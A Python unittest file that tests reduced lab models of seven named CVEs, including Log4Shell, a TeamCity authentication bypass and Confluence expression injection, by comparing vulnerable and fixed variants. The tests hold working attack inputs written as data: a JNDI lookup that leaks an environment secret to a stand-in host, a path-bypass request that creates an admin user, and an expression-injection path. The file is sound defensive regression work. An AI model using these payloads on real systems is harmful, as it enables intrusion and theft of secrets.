"""Verify seven reduced CVE models using independent boundary observations."""
from contextlib import closing, contextmanager
import copy
import importlib.util
import json
import os
from pathlib import Path
import shutil
import sqlite3
import sys
import tempfile
import unittest
from unittest.mock import patch

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "tools"))
from lab import read_catalog, validate
from runner import matches, prepare, process, run_cases
from export_blind import export

FAMILIES = {
    "php2shell": {"CVE-2026-109618", "CVE-2026-109619"},
    "node2shell": {"CVE-2026-111497"},
    "php-cgi": {"CVE-2024-4577"},
    "log4shell": {"CVE-2021-44228"},
    "teamcity": {"CVE-2024-27198"},
    "confluence": {"CVE-2022-26134"},
}


def selected_cases():
    return [case for case in read_catalog() if case.get("family") in FAMILIES]


def load(slug, variant):
    path = ROOT / "labs/python" / slug / variant / "main.py"
    spec = importlib.util.spec_from_file_location("named_cve_fixture", path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


@contextmanager
def workspace():
    previous = Path.cwd()
    with tempfile.TemporaryDirectory(prefix="badass-cve-") as directory:
        os.chdir(directory)
        try:
            yield Path(directory)
        finally:
            os.chdir(previous)


class NamedCatalogTests(unittest.TestCase):
    def test_six_families_have_seven_distinct_cves_and_complete_contracts(self):
        cases = selected_cases()
        self.assertEqual(len(cases), 7)
        self.assertEqual(validate(read_catalog()), len(read_catalog()))
        for family, expected in FAMILIES.items():
            family_cases = [c for c in cases if c["family"] == family]
            self.assertEqual({cve for c in family_cases for cve in c["cve"]}, expected)
            for case in family_cases:
                self.assertIn(case["scope"], {"native-model", "handler-model"})
                self.assertTrue(case["references"])
                for kind in ("benign", "attack", "robustness"):
                    self.assertTrue(any(t["kind"] == kind for t in case["tests"]), (case["id"], kind))

    @unittest.skipUnless(shutil.which("cc"), "Native CVE regressions require a C compiler")
    def test_every_vector_runs_in_both_variants(self):
        cases = selected_cases()
        records, failed = run_cases(cases, strict=True)
        self.assertFalse(failed, json.dumps(records, indent=2))
        self.assertEqual(len(records), 7)
        self.assertEqual(sum(len(r["checks"]) for r in records), 2 * sum(len(c["tests"]) for c in cases))

    def test_native_models_are_included_in_scanner_export(self):
        cases = [c for c in selected_cases() if c["family"] in {"php2shell", "node2shell"}]
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory)
            result = export(cases, base / "corpus", base / "private/key.json")
            self.assertEqual(result["sources"], 6)
            manifest = json.loads((base / "private/key.json").read_text())
            for relative, entry in manifest["files"].items():
                original = next(c for c in cases if c["id"] == entry["case_id"])
                self.assertEqual((base / "corpus" / relative).read_bytes(),
                                 (ROOT / original[entry["variant"]]).read_bytes())


@unittest.skipUnless(shutil.which("cc"), "Native diagnostic tests require a C compiler")
class NativeEvidenceTests(unittest.TestCase):
    def test_asan_observes_real_reads_and_writes_in_vulnerable_models(self):
        probes = [
            ("c/php2shell-oom", "oom-metadata", "heap-use-after-free", "READ of size"),
            ("c/php2shell-stale-state", "late:upload", "heap-use-after-free", "READ of size"),
            ("c/node2shell-block-switch", "distance/1/ABCDEFGHI", "heap-buffer-overflow", "WRITE of size"),
        ]
        for cid, value, diagnostic, access in probes:
            case = next(c for c in selected_cases() if c["id"] == cid)
            with self.subTest(case=cid), tempfile.TemporaryDirectory() as directory:
                build = Path(directory)
                command = prepare(case, "vulnerable", build)
                result = process(command + [value], build, env_overrides={"ASAN_OPTIONS": "detect_leaks=0:halt_on_error=1"})
                self.assertNotEqual(result.returncode, 0)
                self.assertIn("AddressSanitizer: " + diagnostic, result.stderr)
                self.assertIn(access, result.stderr)
                self.assertIn("allocated by thread", result.stderr)
                self.assertIn(case["vulnerable"], result.stderr)

    def test_node2shell_bounds_only_repair_still_fails_short_stream_contract(self):
        case = next(c for c in selected_cases() if c["family"] == "node2shell")
        source = (ROOT / case["fixed"]).read_text()
        before = "if (types <= 1) return FORMAT_ERROR;"
        self.assertEqual(source.count(before), 1)
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory)
            mutant = base / "bounds-only.c"
            mutant.write_text(source.replace(before, "if (types <= 1) return NEEDS_MORE_INPUT;", 1))
            mutated = copy.deepcopy(case)
            mutated["fixed"] = str(mutant)
            command = prepare(mutated, "fixed", base)
            for category in ("literal", "command", "distance"):
                short = process(command + [category + "/1/ABC"], base)
                self.assertFalse(matches(short, {"equals": "FORMAT_ERROR"}, False))
                self.assertEqual(short.stdout, "NEEDS_MORE_INPUT")
                # The added capacity check masks long streams, so short vectors matter.
                long = process(command + [category + "/1/ABCDEFGHI"], base)
                self.assertTrue(matches(long, {"equals": "FORMAT_ERROR"}, False))

    def test_stale_state_early_reset_does_not_cover_late_republication(self):
        case = next(c for c in selected_cases() if c["id"] == "c/php2shell-stale-state")
        source = (ROOT / case["fixed"]).read_text()
        before = "    worker_state = NULL;\n    free(owned);"
        self.assertEqual(source.count(before), 1)
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory)
            mutant = base / "early-reset.c"
            mutant.write_text(source.replace(before, "    if (!late_warning) worker_state = NULL;\n    free(owned);", 1))
            mutated = copy.deepcopy(case)
            mutated["fixed"] = str(mutant)
            command = prepare(mutated, "fixed", base)
            ordinary = process(command + ["abort:warning"], base)
            self.assertTrue(matches(ordinary, {"equals": "RESET"}, False))
            late = process(command + ["late:warning"], base)
            self.assertNotEqual(late.returncode, 0)
            self.assertIn("AddressSanitizer: heap-use-after-free", late.stderr)


class HandlerEvidenceTests(unittest.TestCase):
    def test_log_lookup_receives_private_value_only_in_vulnerable_handler(self):
        message = "${jndi:ldap://lookup.test/${env:LAB_LOG_SECRET}}"
        for variant in ("vulnerable", "fixed"):
            module = load("log4shell-lookup", variant)
            with self.subTest(variant=variant), workspace() as work, \
                    patch.dict(module.CONFIG, {"LAB_LOG_SECRET": "UNIQUE_PRIVATE_MARKER"}), \
                    patch.object(module, "naming_lookup", return_value="LOOKUP_OBSERVED") as lookup:
                module.run({"message": message})
                if variant == "vulnerable":
                    lookup.assert_called_once_with("ldap://lookup.test/UNIQUE_PRIVATE_MARKER")
                    self.assertEqual((work / "application.log").read_text(), "LOOKUP_OBSERVED\n")
                else:
                    lookup.assert_not_called()
                    self.assertEqual((work / "application.log").read_text(), message + "\n")

    def test_teamcity_authorizes_forwarded_route_before_committing_user(self):
        for variant in ("vulnerable", "fixed"):
            module = load("teamcity-dispatch-bypass", variant)
            with self.subTest(variant=variant), workspace():
                with closing(sqlite3.connect("teamcity.sqlite")) as db:
                    db.execute("CREATE TABLE users(name TEXT PRIMARY KEY, role TEXT)")
                    db.execute("INSERT INTO users VALUES('existing', 'reader')")
                    db.commit()
                request = {"path": "/login.html", "query": "jsp=/app/rest/users;.jsp",
                           "token": "LAB_READER_SESSION", "role": "admin"}
                module.run(request)
                with closing(sqlite3.connect("teamcity.sqlite")) as db:
                    rows = db.execute("SELECT name, role FROM users ORDER BY name").fetchall()
                expected = [("existing", "reader")]
                if variant == "vulnerable": expected.append(("lab-user", "admin"))
                self.assertEqual(rows, expected)

    def test_confluence_path_is_not_evaluated_before_fixed_redirect(self):
        path = '/${setHeader("X-Lab", secret)}/'
        for variant in ("vulnerable", "fixed"):
            module = load("confluence-expression-dispatch", variant)
            with self.subTest(variant=variant), patch.object(module, "SECRET", "UNIQUE_SECRET"), \
                    patch.object(module, "evaluate", wraps=module.evaluate) as evaluate:
                result = module.run(path)
                self.assertEqual(result["status"], 302)
                if variant == "vulnerable":
                    evaluate.assert_called_once()
                    self.assertEqual(result["headers"]["X-Lab"], "UNIQUE_SECRET")
                else:
                    evaluate.assert_not_called()
                    self.assertNotIn("X-Lab", result["headers"])
                    self.assertIn("%24%7B", result["headers"]["Location"])


if __name__ == "__main__":
    unittest.main()
